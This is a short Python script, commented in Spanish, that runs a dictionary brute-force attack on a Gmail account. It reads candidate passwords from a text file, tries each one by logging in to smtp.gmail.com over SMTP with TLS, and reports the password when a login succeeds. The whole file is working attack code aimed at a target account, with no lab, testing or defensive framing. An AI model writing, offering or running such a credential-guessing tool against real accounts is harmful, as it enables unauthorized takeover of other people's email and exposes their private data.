import smtplib

# Configuración del servidor de Gmail
smtp_server = 'smtp.gmail.com'
smtp_port = 587

# Datos de la cuenta objetivo
email_objetivo = 'cuenta.ejemplo@gmail.com'

# Archivo con la lista de contraseñas a probar
archivo_passwords = 'passwords.txt'

# Función de fuerza bruta
def fuerza_bruta_gmail(email, archivo_passwords):
    with open(archivo_passwords, 'r') as archivo:
        passwords = archivo.read().splitlines()
        
    for password in passwords:
        print(f'Probando con: {password}')
        try:
            # Iniciar servidor SMTP
            servidor = smtplib.SMTP(smtp_server, smtp_port)
            servidor.ehlo()
            servidor.starttls()  # Iniciar cifrado TLS

            # Intentar autenticación
            servidor.login(email, password)
            
            print(f'¡Contraseña encontrada! La contraseña es: {password}')
            servidor.quit()
            return True
        except smtplib.SMTPAuthenticationError:
            print(f'Fallo con la contraseña: {password}')
        except Exception as e:
            print(f'Error inesperado: {e}')
            break
    
    print('No se encontró ninguna contraseña.')
    return False

# Ejecutar el ataque de fuerza bruta
fuerza_bruta_gmail(email_objetivo, archivo_passwords)
